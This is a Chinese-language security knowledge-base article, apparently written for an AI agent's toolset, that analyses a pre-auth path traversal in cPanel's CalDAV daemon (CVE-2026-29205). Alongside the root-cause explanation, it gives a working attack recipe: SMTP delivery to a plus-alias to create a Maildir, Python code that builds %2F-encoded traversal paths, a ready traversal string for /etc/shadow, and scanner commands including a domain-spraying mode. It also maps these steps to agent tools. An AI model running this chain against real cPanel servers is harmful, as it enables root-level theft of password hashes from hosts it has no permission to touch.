---
id: "ctf-website/09-cve/03-cpanel-caldav-traversal"
title: "cPanel CalDAV 预认证路径穿越（CVE-2026-29205）"
title_en: "cPanel CalDAV Pre-Auth Path Traversal (CVE-2026-29205)"
summary: >
  cPanel CalDAV三层漏洞链分析：第一层CalDAV附件读取路径预认证可达、第二层正则校验先于URL解码导致%2F绕过、第三层权限降级对象生命周期错误导致root权限读取文件。完整攻击链路通过SMTP投递邮件创建Maildir目录→cpdavd路径穿越→root读取/etc/shadow。
summary_en: >
  Three-layer cPanel CalDAV vulnerability chain analysis: layer 1 - CalDAV attachment read path reachable pre-auth, layer 2 - regex validation before URL decoding enables %2F bypass, layer 3 - privilege reduction object lifetime error enables root file reading. Full attack chain via SMTP mail delivery creating Maildir directories → cpdavd path traversal → root reads /etc/shadow.
board: "ctf-website"
category: "09-cve"
signals: ["cPanel", "CalDAV", "path traversal", "pre-auth", "路径穿越", "URL编码绕过", "CVE-2026-29205", "root file read"]
mcp_tools: ["kb_router", "http_probe", "workspace_write_text"]
keywords: ["CVE-2026-29205", "cPanel", "CalDAV", "预认证路径穿越", "URL解码绕过", "root文件读取", "权限降级", "Maildir"]
difficulty: "advanced"
tags: ["cve", "path-traversal", "authentication-bypass", "web-security", "ctf"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# cPanel CalDAV 预认证路径穿越（CVE-2026-29205）

## 1. 受影响版本

cPanel / WHM，修复版本：cPanel 11.134.0.26。暴露端口：2079 (HTTP) / 2080 (HTTPS)。

## 2. 根因：三层漏洞链

**第一层：CalDAV 附件读取路径预认证可达**

`cpdavd` 的 managed attachment GET handler 处理：
```
/calendars/<principal>/<collection>/<attachment-path>
```
特定情况下无需认证即可进入后续文件读取逻辑。

**第二层：先正则校验，后 URL 解码**

```perl
# 正则检查原始 URI（%2F 只是普通字符）
^/calendars/([^/]+)/([^/]+)(/.*)?
^/.+-attachment-(.+)-(.+)$

# 路径通过校验后才 URL 解码
URI::Escape::uri_unescape($attachment_full_path)
```

于是 `%2F` 在解码后变成真正的斜杠：
```
校验时：..%2F..%2F..%2Fetc%2Fshadow
读取时：../../../etc/shadow
```

**第三层：权限降级对象生命周期错误**

```perl
# 有漏洞：临时对象立即析构
'Cpanel::AccessIds::ReducedPrivileges'->new($system_owner);
# 语句结束 → 析构 → 权限恢复为 root

# 修复：绑定到词法变量
my $privs = Cpanel::AccessIds::ReducedPrivileges->new($system_owner);
```

## 3. 攻击链路

```
攻击者 → SMTP 投递 user+x-attachment-1-y@domain 邮件
    → Dovecot 自动创建 .x-attachment-1-y Maildir 目录
    → 请求 cpdavd /calendars/... 路径（含 %2F 编码斜杠）
    → 正则通过 → URL 解码 → 路径穿越
    → 权限降级对象过早析构 → 以 root 读取文件
```

## 4. 路径构造

```python
parts = [".."] * 3
parts.extend(["mail", domain, local_part, f".{folder_name}", "new"])
parts.extend([".."] * 9)
parts.extend(file_path.lstrip("/").split("/"))
return f"/calendars/{principal}/{collection}/{'%2F'.join(parts)}"
```

脚本在两个 collection 下尝试：`calendar` / `addressbook`，两个端口：`2080` / `2079`。

## 5. 前置条件

| 条件 | 说明 |
|------|------|
| cpdavd 可访问 | 2079 / 2080 端口开放 |
| 有效虚拟邮箱 | 必须是 cPanel Email Accounts 创建的真实邮箱 |
| 可投递邮件 | 攻击者能通过 SMTP 投递到该邮箱 |
| Maildir 自动创建 | plus alias 触发 Dovecot 创建 `.x-attachment-1-y` 目录 |

## 6. 复现

```bash
# 安装依赖
pip install -r exploit/requirements.txt

# 配置 SMTP
cp exploit/scanner.ini.example exploit/scanner.ini
# 编辑 SMTP 配置

# 指定目标邮箱（推荐，更稳定）
python3 exploit/scanner.py --config scanner.ini --email admin@example.com example.com

# 自动 spray 模式（从证书 SAN 提取域名 + 邮箱前缀枚举）
python3 exploit/scanner.py --config scanner.ini --exploit example.com
```

### 等待 Maildir 落盘

```python
CALDAV_DEFAULT_WAIT_LADDER = [5, 10, 20, 30]  # 秒
```

每等一轮尝试一次 CalDAV 读取，默认最长约 65 秒。

## 7. 默认读取目标

`/etc/shadow` — 修复前 root 权限读取有内容，修复后普通用户权限返回空，用于区分修复前后。

## 8. 预期输出

```text
[!] host  caldav-traversal  VULNERABLE via admin@host (read 1842b from /etc/shadow)
[+] host  caldav-traversal  NOT VULNERABLE
[?] host  caldav-traversal  CONNECTION FAILED
```

## Evidence

记录: CalDAV 请求/响应、读取文件字节数、文件内容前 200 字节、邮箱投递状态

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 cPanel / CalDAV / 路径穿越信号搜索 |
| HTTP 探测 | `http_probe` | 确认 cpdavd 端口可达 |
| 写分析笔记 | `workspace_write_text` | 记录扫描结果 |

## 参考资料

| 来源 | 链接 |
|------|------|
| cPanel 安全公告 | https://support.cpanel.net/hc/en-us/articles/40437020299927 |
| Searchlight Cyber 分析 | https://slcyber.io/research-center/new-age-of-collisions-reading-arbitrary-files-pre-auth-as-root-in-cpanel-cve-2026-29205 |
| 本仓库工具 | `CVE-2026-29205/exploit/scanner.py` |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-29205%20cPanel2Shell-Scanner |
